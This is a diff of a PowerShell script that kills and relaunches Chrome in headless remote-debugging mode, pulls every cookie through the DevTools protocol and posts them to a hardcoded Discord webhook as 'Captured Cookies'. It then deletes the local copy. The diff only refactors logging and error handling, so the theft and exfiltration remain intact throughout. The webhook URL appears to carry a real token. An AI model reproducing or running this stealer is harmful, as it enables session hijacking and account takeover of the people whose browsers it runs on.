@@ -1,18 +1,16 @@
 # --- CONFIGURATION ---
-$webhookUrl = "https://discord.com/api/webhooks/1372618531245523026/MVdECd09IUHFjbRi3GVewdwa7w-ljoqWZXjfjCUplsUxc5d5RbbboF9ueXl7UW5Qi_1Y"  # Your Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1372618531245523026/MVdECd09IUHFjbRi3GVewdwa7w-ljoqWZXjfjCUplsUxc5d5RbbboF9ueXl7UW5Qi_1Y" # Your webhook
 $remoteDebuggingPort = 9222
 $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
 $outputFile = ".\Chrome-Cookies.json"
 
 # --- FUNCTIONS ---
 
-# Quit Chrome process
 function Quit-Chrome {
     Write-Host "Quitting Chrome if running..."
     Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
 }
 
-# Send and receive WebSocket message
 function Send-Receive-WebSocketMessage {
     param (
         [string] $WebSocketUrl,
@@ -23,19 +21,21 @@ function Send-Receive-WebSocketMessage {
         Add-Type -AssemblyName System.Net.WebSockets
         $webSocket = [System.Net.WebSockets.ClientWebSocket]::new()
 
-        # Connect
+        Write-Host "Connecting to WebSocket: $WebSocketUrl"
         $uri = [Uri]$WebSocketUrl
         $connectTask = $webSocket.ConnectAsync($uri, [Threading.CancellationToken]::None)
         $connectTask.Wait()
 
         if ($webSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
-            throw "WebSocket connection failed. State: $($webSocket.State)"
+            Write-Error "WebSocket connection failed. State: $($webSocket.State)"
+            return $null
         }
 
         # Send message
         $bytesToSend = [Text.Encoding]::UTF8.GetBytes($Message)
         $sendTask = $webSocket.SendAsync($bytesToSend, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None)
         $sendTask.Wait()
+        Write-Host "Message sent to WebSocket."
 
         # Receive response
         $bufferSize = 8192
@@ -54,8 +54,8 @@ function Send-Receive-WebSocketMessage {
         $closeTask = $webSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [Threading.CancellationToken]::None)
         $closeTask.Wait()
 
-        # Return response string
         $responseString = [Text.Encoding]::UTF8.GetString($receivedBytes.ToArray())
+        Write-Host "Received response from WebSocket."
         return $responseString
     } catch {
         Write-Error "WebSocket error: $_"
@@ -65,22 +65,21 @@ function Send-Receive-WebSocketMessage {
 
 # --- MAIN SCRIPT ---
 
-# Quit Chrome if running
+# Clean up any existing Chrome
 Quit-Chrome
 
 # Launch Chrome with remote debugging
-Write-Host "Launching Chrome with remote debugging..."
+Write-Host "Launching Chrome..."
 Start-Process -FilePath $chromePath -ArgumentList "--headless", "--remote-debugging-port=$remoteDebuggingPort", "https://google.com" | Out-Null
-
-# Wait for Chrome to initialize
 Start-Sleep -Seconds 3
 
-# Fetch WebSocket Debugger URL
-$jsonUrl = "http://localhost:$remoteDebuggingPort/json"
+# Fetch WebSocket URL
 try {
-    $jsonResponse = Invoke-RestMethod -Uri $jsonUrl -Method Get
+    $jsonUrl = "http://localhost:$remoteDebuggingPort/json"
+    Write-Host "Fetching Chrome debugging info..."
+    $jsonResponse = Invoke-RestMethod -Uri $jsonUrl -ErrorAction Stop
 } catch {
-    Write-Error "Error fetching Chrome JSON info: $_"
+    Write-Error "Failed to get Chrome debugging info: $_"
     Quit-Chrome
     exit
 }
@@ -88,56 +87,51 @@ try {
 # Extract WebSocket URL
 $WebSocketUrl = $jsonResponse | Select-Object -ExpandProperty webSocketDebuggerUrl
 if ([string]::IsNullOrEmpty($WebSocketUrl)) {
-    Write-Error "Could not find WebSocket debugger URL."
+    Write-Error "WebSocket URL not found."
     Quit-Chrome
     exit
 }
+Write-Host "WebSocket URL: $WebSocketUrl"
 
-# Prepare message to get cookies
-$Message = '{"id":1,"method":"Network.getAllCookies"}'
-
-# Send WebSocket message
-Write-Host "Requesting cookies..."
-$responseString = Send-Receive-WebSocketMessage -WebSocketUrl $WebSocketUrl -Message $Message
+# Send command to get cookies
+$command = '{"id":1,"method":"Network.getAllCookies"}'
+$responseString = Send-Receive-WebSocketMessage -WebSocketUrl $WebSocketUrl -Message $command
 
 if ([string]::IsNullOrEmpty($responseString)) {
-    Write-Error "Failed to receive cookie data."
+    Write-Error "No response received from WebSocket."
     Quit-Chrome
     exit
 }
 
-# Parse JSON response
+# Parse response
 try {
     $responseJson = $responseString | ConvertFrom-Json
 } catch {
-    Write-Error "Failed to parse JSON response: $_"
+    Write-Error "Failed to parse WebSocket response: $_"
     Quit-Chrome
     exit
 }
 
-# Extract cookies array
+# Extract cookies
 if ($responseJson.result -and $responseJson.result.cookies) {
     $cookies = $responseJson.result.cookies
+    Write-Host "Number of cookies retrieved: $($cookies.Count)"
 } else {
-    Write-Error "No cookies found in response."
-    Quit-Chrome
-    exit
+    Write-Host "No cookies found."
+    $cookies = @()
 }
 
-# Convert cookies to JSON string
+# Save cookies
 $cookiesJson = $cookies | ConvertTo-Json -Depth 10
-
-# Save cookies to file (optional)
 Set-Content -Path $outputFile -Value $cookiesJson
 Write-Host "Cookies saved to $outputFile."
 
-# Quit Chrome
+# Close Chrome
 Write-Host "Closing Chrome..."
 Quit-Chrome
 
-# Send cookies to Discord webhook
-Write-Host "Sending cookies to webhook..."
-try {
+# Send to Discord Webhook
+if ($cookies.Count -gt 0) {
     $payload = @{
         username = "CookieBot"
         content = "Captured Cookies at $(Get-Date)"
@@ -150,16 +144,16 @@ try {
         )
     } | ConvertTo-Json -Depth 3
 
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
-    Write-Host "Cookies sent successfully."
-} catch {
-    Write-Error "Failed to send payload to webhook: $_"
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+        Write-Host "Cookies sent to Discord webhook."
+    } catch {
+        Write-Error "Failed to send data to webhook: $_"
+    }
+} else {
+    Write-Host "No cookies to send."
 }
 
 # Cleanup
-if (Test-Path $outputFile) {
-    Remove-Item $outputFile -Force
-    Write-Host "Cleaned up temporary files."
-}
-
-Write-Host "Process completed."
+Remove-Item $outputFile -ErrorAction SilentlyContinue
+Write-Host "Done."
